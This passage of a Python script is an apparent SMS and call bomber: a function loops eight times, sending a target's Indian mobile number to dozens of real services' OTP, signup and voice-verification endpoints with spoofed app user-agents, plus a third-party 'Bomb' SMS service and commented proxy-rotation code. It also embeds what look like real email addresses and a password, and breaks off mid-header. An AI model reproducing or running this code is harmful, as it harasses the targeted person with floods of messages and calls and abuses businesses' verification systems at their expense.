            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'web',
            'viaWhatsapp': False,
            'tel': f'+91{mobile}',
        }

        # response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, json=json_data);pass
        # proxy = FreeProxy(rand=True,timeout=1).get()
        
        # # Replace the URL with the one you want to send a request to
        # url = f'https://smsbombs.in/alfa.php?number={mobile}'

        # # Get a valid proxy
        # proxy = FreeProxy(rand=True,timeout=1).get()

        # # Set up the headers to mimic the user-agent in your curl command
        # headers = {
        #     'User-Agent': 'okhttp/3.9.1'
        # }

        # # Make the request using the chosen proxy
        # try:
        #     response = requests.get(url, headers=headers, proxies={'http': proxy, 'https': proxy}, verify=False)
        #     response.raise_for_status()
        #     print(response.content.decode('utf-8'))
        # except requests.exceptions.RequestException as e:
        #     print(f"An error occurred: {e}")

        


    

def smsfr(number):
    number = str(number)
    mobile = number
    
    for i in range(8):
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'{mobile}',
        }

        response = requests.post('https://unacademy.com/api/v3/user/user_check/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"€hiru"}'.encode()
        #response = requests.post('https://unacademy.com/api/v3/user/user_check/', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'retries': 0.0,
            'phone_number': f'91{mobile}',
        }

        response = requests.post('https://production.apna.co/api/userprofile/v1/otp/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"retries":0.0,"phone_number":"91€hiru"}'.encode()
        #response = requests.post('https://production.apna.co/api/userprofile/v1/otp/', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 0.0,
            'mobile': f'{mobile}',
        }

        response = requests.post('https://web.okcredit.in/api/authn/v1.0/otp:request', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mode":0.0,"mobile":"€hiru"}'.encode()
        #response = requests.post('https://web.okcredit.in/api/authn/v1.0/otp:request', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'{mobile}',
        }

        response = requests.post('https://login.housing.com/api/v2/send-otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"€hiru"}'.encode()
        #response = requests.post('https://login.housing.com/api/v2/send-otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'otpRegistration': 'true',
            'firstName': 'error',
            'lastName': '22',
            'pincode': '380001',
            'channelType': 'android',
            'userId': f'{mobile}',
            'pincodeArea': 'Ahmedabad',
        }

        response = requests.post('https://digital.dmart.in/api/v1/secure/signup', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"otpRegistration":"true","firstName":"error","lastName":"22","pincode":"380001","channelType":"android","userId":"€hiru","pincodeArea":"Ahmedabad"}'.encode()
        #response = requests.post('https://digital.dmart.in/api/v1/secure/signup', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'resendOtp': '0',
            'phoneNumber': '7460092221',
            'hashCode': 'k387IsBaTmn',
            'name': f'{mobile}',
        }

        response = requests.post('https://services.dealshare.in/userservice/api/v1/send-otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"resendOtp":"0","phoneNumber":"7460092221","hashCode":"k387IsBaTmn","name":"€hiru"}'.encode()
        #response = requests.post('https://services.dealshare.in/userservice/api/v1/send-otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone_no': f'+91{mobile}',
            'website': True,
            'is_guest_checkout': False,
        }

        response = requests.post('https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone_no":"+91€hiru","website":true,"is_guest_checkout":false}'.encode()
        #response = requests.post('https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'payload': {
                'allowWhatsapp': False,
                'mobile': f'+91{mobile}',
            },
            'type': 'mobile',
        }

        response = requests.post('https://auth.eka.care/auth/init', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"payload":{"allowWhatsapp":false,"mobile":"+91€hiru"},"type":"mobile"}'.encode()
        #response = requests.post('https://auth.eka.care/auth/init', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'android',
            'instanceId': 'esXLqB--T2CmMBR6f4BHy9',
            'mobile': f'{mobile}',
        }

        response = requests.post('https://card.fplabs.tech:9000/onecard/bff/open/v1/register/otp/voice', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"deviceType":"android","instanceId":"esXLqB--T2CmMBR6f4BHy9","mobile":"€hiru"}'.encode()
        #response = requests.post('https://card.fplabs.tech:9000/onecard/bff/open/v1/register/otp/voice', headers=headers, data=data)


        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }
        mj = f'https://prod.myjar.app/v2/api/auth/sendOTP/call?phoneNumber={mobile}&countryCode=91'

        response = requests.get(mj, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone_number': f'+91{mobile}',
        }

        response = requests.post('https://api.relevel.com/api/v2/users/send-otp/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone_number":"+91€hiru"}'.encode()
        #response = requests.post('https://api.relevel.com/api/v2/users/send-otp/', headers=headers, data=data)


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile': f'{mobile}',
        }

        #response = requests.post('https://prod.efeed.in/api/customer/sendOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobile":"€hiru"}'.encode()
        #response = requests.post('https://prod.efeed.in/api/customer/sendOtp', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        mc = f'https://be.mcdelivery.co.in/auth/otp/{mobile}'

        response = requests.get(mc, headers=headers);pass


        


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        ok = f'https://be.mcdelivery.co.in/auth/otp/{mobile}/'

        response = requests.get(ok, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'+91{mobile}',
        }

        response = requests.post('https://us-central1-bikai-d5ee5.cloudfunctions.net/generateOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"+91€hiru"}'.encode()
        #response = requests.post('https://us-central1-bikai-d5ee5.cloudfunctions.net/generateOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNumber': f'{mobile}',
            'otpTemplateId': '5b4e2e49b70e040008ffbcbe',
        }

        response = requests.post('https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobileNumber":"€hiru","otpTemplateId":"5b4e2e49b70e040008ffbcbe"}'.encode()
        #response = requests.post('https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobile_number': f'{mobile}',
            'client_id': 'kisan-app',
        }

        response = requests.post('https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobile_number":"€hiru","client_id":"kisan-app"}'.encode()
        #response = requests.post('https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'auto_retry': False,
            'mobile_no': f'+91{mobile}',
            'allow_whatsapp': False,
        }

        response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"auto_retry":false,"mobile_no":"+91€hiru","allow_whatsapp":false}'.encode()
        #response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'+91-{mobile}',
            'app_client_id': '90391da1-ee49-4378-bd12-1924134e906e',
        }

        response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"+91-€hiru","app_client_id":"90391da1-ee49-4378-bd12-1924134e906e"}'.encode()
        #response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'sendOtpToWhatsApp': False,
            'loginAttemptCounter': 3.0,
            'mobileNo': f'{mobile}',
        }

        response = requests.post('https://app-api.fthdaily.in/api/v2/customers/generate-otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"sendOtpToWhatsApp":false,"loginAttemptCounter":3.0,"mobileNo":"€hiru"}'.encode()
        #response = requests.post('https://app-api.fthdaily.in/api/v2/customers/generate-otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'{mobile}',
        }

        response = requests.post('https://www.licious.in/api/login/signup', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"€hiru"}'.encode()
        #response = requests.post('https://www.licious.in/api/login/signup', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'android',
            'instanceId': 'esXLqB--T2CmMBR6f4BHy9',
            'mobile': f'{mobile}',
            'whatsappConsent': True,
        }

        response = requests.post(
            'https://card.fplabs.tech:9000/onecard/bff/open/v2/register/otp/generate',
            headers=headers,
            json=json_data,
        )

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"deviceType":"android","instanceId":"esXLqB--T2CmMBR6f4BHy9","mobile":"€hiru","whatsappConsent":true}'.encode()
        #response = requests.post('https://card.fplabs.tech:9000/onecard/bff/open/v2/register/otp/generate', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'buildVersion': '24.0',
            'phone': f'{mobile}',
            'source': 'signup',
            'type': 'p',
            'device': 'mobile',
            'email': '',
        }

        response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"buildVersion":"24.0","phone":"€hiru","source":"signup","type":"p","device":"mobile","email":""}'.encode()
        #response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isGupshup': True,
            'contact': f'{mobile}',
            'email': 'shivamrajput200@gmail.com',
        }

        response = requests.post('https://api.mamaearth.in/v1/auth/initiateSignup', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"isGupshup":true,"contact":"€hiru","email":"shivamrajput200@gmail.com"}'.encode()
        #response = requests.post('https://api.mamaearth.in/v1/auth/initiateSignup', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        ll = f'https://www.skechers.in/resendotp/?phone={mobile}&phoneLogin=true'

        response = requests.get(ll, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'customer_mobile': f'{mobile}',
        }

        response = requests.post('https://www.nykaafashion.com/webscripts/api/otp/generate', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"customer_mobile":"€hiru"}'.encode()
        #response = requests.post('https://www.nykaafashion.com/webscripts/api/otp/generate', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'auto_retry': False,
            'mobile_no': f'+91{mobile}',
            'allow_whatsapp': True,
        }

        response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"auto_retry":false,"mobile_no":"+91€hiru","allow_whatsapp":true}'.encode()
        #response = requests.post('https://cowin.eka.care/v2/generate_otp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phone': f'+91{mobile}',
        }

        response = requests.post('https://entri.app/api/v3/users/check-phone/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phone":"+91€hiru"}'.encode()
        #response = requests.post('https://entri.app/api/v3/users/check-phone/', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'user_id': f'{mobile}',
        }

        response = requests.post('https://www.samsung.com/in/api/v1/sso/otp/init', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"user_id":"€hiru"}'.encode()
        #response = requests.post('https://www.samsung.com/in/api/v1/sso/otp/init', headers=headers, data=data)


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'variables': {
                'mobileNumber': f'{mobile}',
            },
            'query': 'mutation CreateAccountOTP($mobileNumber: String!) {\n  createAccountOTP(mobileNumber: $mobileNumber) {\n    status\n    message\n    __typename\n  }\n}',
            'operationName': 'CreateAccountOTP',
        }

        response = requests.post('https://www.mobex.in/graphql', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"variables":{"mobileNumber":"€hiru"},"query":"mutation CreateAccountOTP($mobileNumber: String!) {\\n  createAccountOTP(mobileNumber: $mobileNumber) {\\n    status\\n    message\\n    __typename\\n  }\\n}","operationName":"CreateAccountOTP"}'.encode()
        #response = requests.post('https://www.mobex.in/graphql', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isPlaycircle': False,
            'mobile': f'{mobile}',
            'deviceId': '72abdd9a-7038-41c0-a57d-d0022dac60da',
            'deviceName': '',
            'refCode': '',
        }

        response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"isPlaycircle":false,"mobile":"€hiru","deviceId":"72abdd9a-7038-41c0-a57d-d0022dac60da","deviceName":"","refCode":""}'.encode()
        #response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNo': f'+91{mobile}',
            'userName': 'raghavsdss',
        }

        response = requests.post('https://khiladi.com/v1/exchange/user/userRegisterOtpSent', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mobileNo":"+91€hiru","userName":"raghavsdss"}'.encode()
        #response = requests.post('https://khiladi.com/v1/exchange/user/userRegisterOtpSent', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        og = f'https://www.mylorides.com/notifications/send_sms_to_num?mobile_num={mobile}'

        response = requests.get(og, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'isPlaycircle': False,
            'mobile': f'{mobile}',
            'deviceId': '1aeb7fad-58d0-4887-9f77-2a469039a413',
            'deviceName': '',
            'refCode': '',
        }

        response = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"isPlaycircle":false,"mobile":"€hiru","deviceId":"1aeb7fad-58d0-4887-9f77-2a469039a413","deviceName":"","refCode":""}'.encode()
        #response = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', headers=headers, data=data)


        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        tk =f'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={mobile}'

        response = requests.get(tk, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'phoneNo': f'{mobile}',
        }

        response = requests.post('https://www.loanbaba.com/vywurpzr/MAppService.asmx/SendOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"phoneNo":"€hiru"}'.encode()
        #response = requests.post('https://www.loanbaba.com/vywurpzr/MAppService.asmx/SendOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'otp_mode': 'SIGNUP',
            'mobile': f'{mobile}',
        }

        response = requests.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"otp_mode":"SIGNUP","mobile":"€hiru"}'.encode()
        #response = requests.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            '_ClientVersion': 'js3.4.4',
            '_InstallationId': 'e7beffbd-466a-4e88-8e8f-377b31e4782a',
            'mobileNumber': f'{mobile}',
            'digest': '24f17c1f25f8750c556e70cab0c62e0dce7df7945b26f5a27e2570f8575dec6a',
            '_ApplicationId': 'myAppId',
            'time': '2023-10-12T05:54:59.229Z',
            'deviceId': '243b0f7d0b6a1f15cdc8',
        }

        response = requests.post('https://api.cureskin.com/api/parse/functions/retryOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"_ClientVersion":"js3.4.4","_InstallationId":"e7beffbd-466a-4e88-8e8f-377b31e4782a","mobileNumber":"€hiru","digest":"24f17c1f25f8750c556e70cab0c62e0dce7df7945b26f5a27e2570f8575dec6a","_ApplicationId":"myAppId","time":"2023-10-12T05:54:59.229Z","deviceId":"243b0f7d0b6a1f15cdc8"}'.encode()
        #response = requests.post('https://api.cureskin.com/api/parse/functions/retryOTP', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'number': f'{mobile}',
            'is_corporate_user': False,
            'otp_on_call': True,
        }

        response = requests.post('https://www.1mg.com/auth_api/v6/create_token', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"number":"€hiru","is_corporate_user":false,"otp_on_call":true}'.encode()
        #response = requests.post('https://www.1mg.com/auth_api/v6/create_token', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 'SMS',
            'new_user': True,
            'mobile_number': f'{mobile}',
            'device': 'Android',
        }

        response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"mode":"SMS","new_user":true,"mobile_number":"€hiru","device":"Android"}'.encode()
        #response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, data=data)


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'ad_set_id': '',
            'device_id': '8ecdf954a6956e20',
            'ad_name': '',
            'channel': '',
            'placement_id': '',
            'ad_id': '',
            'keyword_id': '',
            'campaign': '',
            'placement': '',
            'keyword': '',
            'mobile_number': f'{mobile}',
            'ad_set_name': '',
            'campaign_id': '',
        }

        response = requests.post('https://api.cityflo.com/api/v2/users/auth/init/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"ad_set_id":"","device_id":"8ecdf954a6956e20","ad_name":"","channel":"","placement_id":"","ad_id":"","keyword_id":"","campaign":"","placement":"","keyword":"","mobile_number":"€hiru","ad_set_name":"","campaign_id":""}'.encode()
        #response = requests.post('https://api.cityflo.com/api/v2/users/auth/init/', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        ggg = f'https://dash.bcykal.com/mobycy/api/user/generate/otp?mobile={mobile}&forgotPwdFlag=false&type=ROLE_HERO_DRIVER'

        response = requests.get(
            ggg,
            headers=headers,
        )


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        fff = f'https://www.healthkart.com/veronica/user/validate/voice/1/{mobile}/signup'


        response = requests.get(fff, headers=headers);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'plt': '2',
            'st': '1',
        }

        goo = f'https://www.healthkart.com/veronica/user/validate/voice/1/{mobile}/signup'

        response = requests.get(
            goo,
            params=params,
            headers=headers,
        )


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'retry_mode': 'voice',
            'mobile': f'{mobile}',
        }

        response = requests.post('https://api.tendercuts.in/otp/retry/', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"retry_mode":"voice","mobile":"€hiru"}'.encode()
        #response = requests.post('https://api.tendercuts.in/otp/retry/', headers=headers, data=data)


        headers = {
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }
        gg = f'https://api.magicbricks.com/bricks/verifyOnCall.html?identifier=callmade&mobile={mobile}'

        response = requests.get(
            gg,
            headers=headers,
        )


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            '_ClientVersion': 'js3.4.4',
            '_InstallationId': 'e7beffbd-466a-4e88-8e8f-377b31e4782a',
            'mobileNumber': f'{mobile}',
            'digest': '9ef2f5395e651c77e860f12a8d966d69988e9642f9ebc9b85dac0bc84229c3a9',
            '_ApplicationId': 'myAppId',
            'source': 'android',
            'time': '2023-10-12T05:54:28.093Z',
            'deviceId': '243b0f7d0b6a1f15cdc8',
        }

        response = requests.post('https://api.cureskin.com/api/parse/functions/requestOTP', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"_ClientVersion":"js3.4.4","_InstallationId":"e7beffbd-466a-4e88-8e8f-377b31e4782a","mobileNumber":"€hiru","digest":"9ef2f5395e651c77e860f12a8d966d69988e9642f9ebc9b85dac0bc84229c3a9","_ApplicationId":"myAppId","source":"android","time":"2023-10-12T05:54:28.093Z","deviceId":"243b0f7d0b6a1f15cdc8"}'.encode()
        #response = requests.post('https://api.cureskin.com/api/parse/functions/requestOTP', headers=headers, data=data)


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        ff = f'https://dash.bcykal.com/mobycy/api/user/generate/otp?mobile={mobile}&forgotPwdFlag=false'

        response = requests.get(
            ff,
            headers=headers,
        )


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'web',
            'viaWhatsapp': True,
            'tel': f'+91{mobile}',
        }

        response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, json=json_data);pass

        # Note: json_data will not be serialized by requests
        # exactly as it was in the original request.
        #data = '{"deviceType":"web","viaWhatsapp":true,"tel":"+91€hiru"}'.encode()
        #response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, data=data)


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'actionRequestContext': {
                'type': 'LOGIN_IDENTITY_VERIFY',
                'loginIdPrefix': '+91',
                'loginId': f'{mobile}',
                'clientQueryParamMap': {
                    'ret': '/reseller-homepage-store?utm_medium=GoogleAd&utm_campaign=Google-PerfMax&cmpid=Google-PerfMax&cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=Cj0KCQjwk96lBhDHARIsAEKO4xb159ag92ss6ZJ0PuwGTfP-_3zKG3NdBZWTSjSvOS8NEDTPDwfhSB0aAji5EALw_wcB',
                    'entryPage': 'HEADER_ACCOUNT',
                },
                'loginType': 'MOBILE',
                'verificationType': 'OTP',
                'screenName': 'LOGIN_V4_MOBILE',
                'sourceContext': 'DEFAULT',
            },
        }

        response = requests.post('https://www.shopsy.in/api/1/action/view', headers=headers, json=json_data);pass

    

        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'userTitle': 'Mr.',
            'password': 'Sloe82@@',
            'countryCode': '+91',
            'mobile': f'{mobile}',
            'name': 'David ',
            'flashCall': 'true',
            'metaDID': '3d1b663996bf7dc7',
            'platformId': '2',
            'metaSV': '1',
            'email': 'helovogoduddub@gmail.com',
            'visitorId': '358409124',
            'metaAV': '394-3.58.2.1',
        }

        response = requests.post('https://www.winni.in/app/v3/auth/customer/signup', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'feature': '',
            'phone': f'+91-{mobile}',
            'type': 'call',
            'app_client_id': '12d13938-60f3-4a3e-ab56-ddadb86913a2',
        }

        response = requests.post('https://identity.tllms.com/api/request_otp', headers=headers, json=json_data);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mode': 'WHATSAPP',
            'new_user': False,
            'mobile_number': f'{mobile}',
            'device': 'Android',
        }

        response = requests.post('https://api.countrydelight.in/api/v1/customer/requestOtp', headers=headers, json=json_data);pass

        

        headers = {
            'user-agent': 'okhttp/3.9.1',
        }

        urllff =  f'https://appapi.apollodiagnostics.in/v1/registration/send-otp-for-registration?mobile_number={mobile}'

        response = requests.get(urllff,
            headers=headers,
        )


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        params = {
            'osId': '776adbc43e26e1b3',
            'width': '1080',
            'height': '2260',
            'density': '2.75',
            'andOsVersion': '13',
            'userId': '10042661915',
        }

        json_data = {
            'phoneNumber': f'{mobile}',
            'deliveryMode': 'CALL',
        }

        response = requests.post('https://mobile-api-v5.nearbuy.com/v5/otp/resend', params=params, headers=headers, json=json_data);pass


        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Connection': 'Keep-Alive',
            'User-Agent': 'okhttp/3.9.1',
        }

        json_data = {
            'mobileNo': f'{mobile}',
            'processType': 'Login',
            'source': 'Web',
        }

        response = requests.post('https://ottmobileapis.dishtv.in/Api/NewUserManagement/GenerateOTP', headers=headers, json=json_data);pass


        headers = {
            'user-agent': 'okhttp/3.9.1',
        }
        urlg  = f'https://termux.xyz/wp-content/uploads/sms.php?mobile={mobile}&submit=Bomb'

        response = requests.get(urlg, headers=headers);pass


        headers = {
            'content-type': 'application/json; charset=utf-8',
            'user-agent': 'okhttp/3.9.1',
        }

        json_data = {
            'deviceType': 'web',
            'viaWhatsapp': False,
            'tel': f'+91{mobile}',
        }

        response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, json=json_data);pass


        UG = ua.chrome
    
        headers = {
            'Host': 'auth.udaan.com',
            'content-length': '17',
            'x-app-id': 'udaan-auth',
            'traceparent': '00-94a6e0bccbb332c53f129ca9ef6e71b8-adcc060214b06b40-00',
            'accept-language': 'en-IN',
            'user-agent': UG,
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'accept': '*/*',
            'origin': 'https://auth.udaan.com',
            'x-requested-with': 'pure.lite.browser',
